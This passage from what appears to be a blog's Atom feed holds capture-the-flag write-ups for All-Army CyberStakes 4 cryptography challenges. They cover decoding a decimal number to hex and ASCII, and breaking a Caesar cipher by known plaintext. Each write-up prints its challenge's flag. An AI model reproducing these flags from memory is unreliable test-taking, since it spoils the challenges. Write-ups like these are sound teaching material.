represented by a number. Hexadecimal numbers are used since it’s easy to represent individual bytes of data with it. Every 4-bits of data are represented by one hex number, so a byte (8-bits) is represented by two hex numbers. For example, the string ABCDE is represented in hex as 0x4142434445. We can also represent these hex numbers as a normal decimal number. If we convert the previous hex number into decimal, we can also write the string ABCDE as the number 280284578885. Keep in mind, this is an unusual way to represent strings since, unlike hex, a small change in any character will drastically change the entire decimal number. Changing the string to BBCDE causes it to become the number 284579546181, while its hex version simply sees a change in the first two places, 0x4242434445. To get the flag, we just need to apply this principle in the reverse direction: Convert the decimal number into hex and then decode each byte into its character equivalent. We can easily perform this task by using CyberChef again. 1 2 3 Decimal Plaintext: 104873340459054924181115292546315913092670500490515826417481341 Hex Plaintext: 0x4143497b5072316d33735f54214d337a5f34373533393062367d ASCII Plaintext: ACI{Pr1m3s_T!M3z_475390b6}</summary></entry><entry><title type="html">All-Army CyberStakes 4 - Cryptography (Rotate Me)</title><link href="https://bernardsmith0892.github.io/posts/acictf4-rotateme/" rel="alternate" type="text/html" title="All-Army CyberStakes 4 - Cryptography (Rotate Me)" /><published>2020-05-13T00:00:00-10:00</published><updated>2020-05-13T00:00:00-10:00</updated><id>https://bernardsmith0892.github.io/posts/acictf4-rotateme</id><content type="html" xml:base="https://bernardsmith0892.github.io/posts/acictf4-rotateme/">&lt;h1 id=&quot;rotate-me-5-points&quot;&gt;Rotate Me (5 Points)&lt;/h1&gt;

&lt;p&gt;This one is a very simple problem, especially considering it’s only worth 5 points. We start with a text file that contains enciphered text, which already seems to be in the expected format of a flag.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;IKQ{KzGxBw_NcV_nWz_ItT_ScrflorN}
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Based on the name of the challenge and the hints mentioning “Julius”, it’s safe to assume that this is a &lt;em&gt;Caesar cipher&lt;/em&gt;, also known as a &lt;em&gt;Rotation (ROT-N) cipher&lt;/em&gt;. This is a very simple enciphering method where you “shift” each character to the right by &lt;em&gt;N&lt;/em&gt; number of places. Going beyond “Z” just causes you to rotate back around to “A”, which is where the term &lt;em&gt;Rotation cipher&lt;/em&gt; comes from. In order to decrypt the text, you just need to shift the characters the same number of places in the &lt;em&gt;other&lt;/em&gt; direction to the left. For example, in a classic Caesar (or ROT-3) cipher the encryption and decryption process looks like this:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;Plaintext:  HELLO WORLD
Ciphertext: KHOOR ZRUOG
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Since you rotate back to “A” when you hit “Z”, anything above a ROT-25 cipher is equivalent to a cipher between ROT-0 to ROT-25. (You can calculate exactly what it’s equivalent to by computing &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;N mod 26&lt;/code&gt;) This means that the total number of possible keys in a Caesar cipher is only &lt;strong&gt;25&lt;/strong&gt;. This is easily brute-forced by hand and is exceptionally trivial for a computer to crack. However, if we wanted to be fancy about it, we can crack it like a &lt;em&gt;known-plaintext attack&lt;/em&gt;. We know that the first three characters have to be &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ACI&lt;/code&gt;. By comparing first letters of the plaintext and ciphertext, we can calculate that the key is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;9 - 1 = 8&lt;/code&gt;, since &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;A&lt;/code&gt; is the 1st character of the alphabet and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;I&lt;/code&gt; is the 9th. So by rotating to the left by &lt;strong&gt;8&lt;/strong&gt; spaces (or 18 spaces to the right, since &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-8 mod 26 = 18&lt;/code&gt;), we can decrypt the flag. It’s easy to do this using a common tool such as &lt;a href=&quot;https://gchq.github.io/CyberChef/#recipe=ROT13(true,true,18)&amp;amp;input=SUtRe0t6R3hCd19OY1Zfbld6X0l0VF9TY3JmbG9yTn0&quot;&gt;CyberChef&lt;/a&gt;.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;Ciphertext: IKQ{KzGxBw_NcV_nWz_ItT_ScrflorN}
Plaintext:  ACI{CrYpTo_FuN_fOr_AlL_KujxdgjF}
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name></name></author><category term="CTF" /><category term="AllArmyCyberStakes4" /><category term="cryptography" /><summary type="html">Rotate Me (5 Points)</summary></entry></feed>